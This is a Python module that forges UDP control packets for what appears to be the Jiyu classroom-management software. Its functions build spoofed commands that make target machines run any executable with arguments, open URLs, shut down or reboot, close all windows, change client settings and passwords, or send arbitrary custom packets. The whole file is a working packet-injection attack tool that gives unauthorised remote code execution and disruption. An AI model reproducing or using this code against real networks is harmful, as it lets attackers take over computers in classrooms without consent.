"""
This module is used to forge Jiyu UDP packets.
"""

from __future__ import annotations

import binascii
import secrets

from typing import Literal, Optional, Union


__all__ = [
    "pkg_message",
    "pkg_execute",
    "pkg_website",
    "pkg_shutdown",
    "pkg_close_windows",
    "pkg_close_top_window",
    "pkg_rename",
    "pkg_customize",
]


def format_data(data: str, max_length: Optional[int] = None) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the output byte array.

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    if not isinstance(data, str):
        raise TypeError(f"Expected string, got {type(data).__name__}")
    if max_length is None:
        return data.encode("utf-16le")
    if not isinstance(max_length, int):
        raise TypeError(f"Expected int, got {type(max_length).__name__}")
    if max_length <= 0:
        raise ValueError(f"Invalid maximum length: {max_length}")
    padded_bytes = data.encode("utf-16le").ljust(max_length, b"\x00")
    if len(padded_bytes) > max_length:
        raise ValueError(f"Data exceeds maximum length: {len(padded_bytes)} > {max_length}")
    return padded_bytes


def pkg_message(msg: str) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.
    """
    data = format_data(msg, 800)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    return head + data + b"\x00" * 98


def pkg_execute(
    executable_file: str,
    arguments: str = "",
    mode: Literal["normal", "minimize", "maximize"] = "normal",
) -> bytes:
    """
    Packages a command with an executable file and optional arguments into a specific byte format.

    Args:
        executable_file (str): The name of the executable file to run.
        arguments (str, optional): The command-line arguments to pass to the executable. Defaults to an empty string.
        mode (Literal["normal", "minimize", "maximize"], optional): The mode of execution. Defaults to "normal".

    Returns:
        bytes: The packaged command as a byte array, including a header and formatted data.
    """
    head = (
        b"DMOC\x00\x00\x01\x00n\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01a\x03\x00\x00a\x03\x00\x00"
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    )
    data0 = format_data(executable_file, 512)
    data1 = format_data(arguments, 254)
    if mode == "normal":
        data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    elif mode == "minimize":
        data2 = b"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    elif mode == "maximize":
        data2 = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    else:
        raise ValueError(f"Invalid mode: {mode}")
    return head + data0 + data1 + b"\x00" * 66 + data2


def pkg_website(url: str) -> bytes:
    """
    Packages a website URL into a specific byte format, including a header and padding.

    Args:
        url (str): The website URL to package.

    Returns:
        bytes: The packaged URL as a byte array, including a header and padding.
    """
    data = format_data(url)

    head = (
        b"DMOC\x00\x00\x01\x00"
        + (len(data) + 36).to_bytes(4, "little")
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01"
        + (len(data) + 23).to_bytes(4, "little")
        + (len(data) + 23).to_bytes(4, "little")
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
    )

    return head + data + b"\x00" * 4


def pkg_shutdown(timeout: Optional[int] = None, message: str = "", reboot: bool = False) -> bytes:
    """
    Packages a shutdown or reboot command into a specific byte format, including a header and formatted data.

    Args:
        timeout (Optional[int]): The time in seconds before the shutdown or reboot occurs. If None, it defaults to immediate execution.
        message (str): The message to display during the shutdown or reboot process.
        reboot (bool): If True, the command will initiate a reboot; if False, it will initiate a shutdown.

    Returns:
        bytes: The packaged shutdown or reboot command as a byte array, including a header and formatted data.
    """
    head = (
        b"DMOC\x00\x00\x01\x00*\x02\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01\x1d\x02\x00\x00\x1d\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00"
        + (b"\x13\x00" if reboot else b"\x14\x00")
        + (b"\x00\x10" if timeout is None else b"\x00\x00")
        + (timeout or 0).to_bytes(4, "little")
        + b"\x01\x00\x00\x00\x00\x00\x00\x00"
    )
    data = format_data(message, 256)
    return head + data + b"\x00" * 258


def pkg_close_windows(timeout: Optional[int] = None, message: str = "") -> bytes:
    """
    Packages a command to close all student windows into a specific byte format, including a header and formatted data.

    Args:
        timeout (Optional[int]): The time in seconds before the windows are closed. If None, it defaults to immediate execution.
        message (str): The message to display during the window closing process.

    Returns:
        bytes: The packaged close windows command as a byte array, including a header and formatted data
    """
    head = (
        b"DMOC\x00\x00\x01\x00*\x02\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01\x1d\x02\x00\x00\x1d\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x02\x00"
        + (b"\x00\x10" if timeout is None else b"\x00\x00")
        + (timeout or 0).to_bytes(4, "little")
        + b"\x01\x00\x00\x00\x00\x00\x00\x00"
    )
    data = format_data(message, 256)
    return head + data + b"\x00" * 258


def pkg_close_top_window() -> bytes:
    """
    Packages a command to close the top window into a specific byte format, including a header.

    Returns:
        bytes: The packaged command to close the top window as a byte array, including a header.
    """
    head = (
        b"DMOC\x00\x00\x01\x00n\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\x01\x9ba\x03\x00\x00a\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00"
    )
    return head + b"\x00" * 850


def pkg_rename(name: str, name_id: int = 0) -> bytes:
    """
    Packages a command to rename a file or directory into a specific byte format, including a header.

    Args:
        name (str): The new name for the file or directory.
        name_id (int, optional): An identifier for the name. Defaults to 0.

    Returns:
        bytes: The packaged rename command as a byte array, including a header and formatted data.
    """
    head = b"GCMN\x00\x00\x01\x00D\x00\x00\x00f\xb1\xe4\x92?\x9a6J\x94:=\xa3\xbd\x97`A" + name_id.to_bytes(4, "little")
    data = format_data(name + "\x00", 64)
    return head + data


def pkg_setting(
    network: bool = False,
    transmission_reliability: Literal["low", "medium", "high"] = "medium",
    offline_lag_time_detection: int = 10,
    audio: bool = False,
    playback_mute: bool = False,
    recording_mute: bool = False,
    recording_volume: int = 80,
    playback_volume: int = 80,
    password: bool = False,
    password_value: str = "",
    preventing_process_termination: Literal["disable", "enable", "auto"] = "auto",
    lock_screen_when_maliciously_offline: Literal["disable", "enable", "auto"] = "auto",
    hide_the_setup_name_button: Literal["disable", "enable", "auto"] = "auto",
) -> bytes:
    """
    Packages a command to set various application settings into a specific byte format, including a header and formatted data.

    Args:
        network (bool): Whether to enable network settings.
        transmission_reliability (Literal["low", "medium", "high"]): The level of transmission reliability.
        offline_lag_time_detection (int): The time in seconds for offline lag time detection.
        audio (bool): Whether to enable audio settings.
        playback_mute (bool): Whether to mute playback audio.
        recording_mute (bool): Whether to mute recording audio.
        recording_volume (int): The volume level for recording audio (0-100).
        playback_volume (int): The volume level for playback audio (0-100).
        password (bool): Whether to enable password protection.
        password_value (str): The password value to set, if password protection is enabled.
        preventing_process_termination (Literal["disable", "enable", "auto"]): Setting for preventing process termination.
        lock_screen_when_maliciously_offline (Literal["disable", "enable", "auto"]): Setting for locking the screen when maliciously offline.
        hide_the_setup_name_button (Literal["disable", "enable", "auto"]): Setting for hiding the setup name button.
    """
    lv = {"low": 0, "medium": 1, "high": 2}
    setup = {"disable": 0, "enable": 1, "auto": 2}
    head = (
        b"DMOC\x00\x00\x01\x00\x95\x00\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01\x88\x00\x00\x00\x88\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00{\x00\x00\x00"
    )
    network_setup = (
        int(network).to_bytes(4, "little")
        + lv[transmission_reliability].to_bytes(4, "little")
        + offline_lag_time_detection.to_bytes(4, "little")
    )
    audio_setup = (
        int(audio).to_bytes(4, "little")
        + int(playback_mute).to_bytes(4, "little")
        + int(recording_mute).to_bytes(4, "little")
        + recording_volume.to_bytes(4, "little")
        + playback_volume.to_bytes(4, "little")
    )
    passwd_setup = int(password).to_bytes(4, "little") + format_data(password_value + "\x00", 66)
    secure_setup = (
        setup[preventing_process_termination].to_bytes(4, "little")
        + setup[lock_screen_when_maliciously_offline].to_bytes(4, "little")
        + setup[hide_the_setup_name_button].to_bytes(4, "little")
    )
    return head + network_setup + audio_setup + passwd_setup + secure_setup + b"\x00" * 3


class Rand16:
    """
    A class to generate random bytes of specified lengths, accessible as attributes.
    """

    def __getattr__(self, name: str) -> str:
        if name.startswith("size_"):
            length = name[5:]
            if length.isdigit():
                return secrets.token_bytes(int(length)).hex()
        raise AttributeError(f"Rand16 has no attribute '{name}'")

    def __getitem__(self, key: int) -> str:
        if isinstance(key, int) and key > 0:
            return secrets.token_bytes(key).hex()
        raise TypeError(f"Key must be a positive integer, got {key}")

    def __str__(self) -> str:
        return secrets.token_bytes(1).hex()

    def __repr__(self) -> str:
        return self.__str__()


rand16 = Rand16()


class HexInt:
    """
    A class to represent a non-negative integer with methods to access its byte representation in little-endian and big-endian formats.
    """

    def __init__(self, value: int = 0):
        if not isinstance(value, int) or value < 0:
            raise ValueError("Value must be a non-negative integer")
        self.value = value

    def __getattr__(self, name: str) -> Union[HexStr, HexInt]:
        try:
            if name.startswith("little_"):
                return HexStr(self.value.to_bytes(int(name[7:]), "little").hex())
            if name.startswith("big_"):
                return HexStr(self.value.to_bytes(int(name[4:]), "big").hex())
            if name.startswith("add_"):
                return HexInt(self.value + int(name[4:]))
            if name.startswith("sub_"):
                return HexInt(self.value - int(name[4:]))
            if name.startswith("mul_"):
                return HexInt(self.value * int(name[4:]))
            if name.startswith("div_"):
                return HexInt(self.value // int(name[4:]))
            if name.startswith("mod_"):
                return HexInt(self.value % int(name[4:]))
        except ValueError:
            pass

        raise AttributeError(f"HexInt has no attribute '{name}'")

    def __str__(self) -> str:
        return str(self.value)

    def __repr__(self) -> str:
        return self.__str__()


class HexStr:
    """
    A class to represent a string with methods to access its byte representation in hexadecimal format.
    """

    def __init__(self, value: str = ""):
        self.value = str(value)

    def __getattr__(self, name: str) -> Union[HexStr, HexInt]:
        try:
            if name == "len":
                return HexInt(len(self.value))
            if name == "hex":
                return HexStr(self.value.encode("utf-8").hex())
            if name == "int":
                return HexInt(int(self.value))
            if name.startswith("int_"):
                return HexInt(int(self.value, int(name[4:])))
            if name.startswith("size_"):
                return HexStr(format_data(self.value, int(name[5:])).hex())
        except ValueError:
            pass

        raise AttributeError(f"HexStr has no attribute '{name}'")

    def __str__(self) -> str:
        return self.value

    def __repr__(self) -> str:
        return self.__str__()


def pkg_customize(format_str: str, *args: str) -> bytes:
    """
    Packages a custom command into a specific byte format based on a format string and arguments.

    Args:
        format_str (str): The format string defining the structure of the command.
        *args (str): The arguments to be formatted according to the format string.

    Returns:
        bytes: The packaged command as a byte array, including a header and formatted data.
    """
    return binascii.unhexlify(format_str.format(*map(HexStr, args), rand16=rand16))
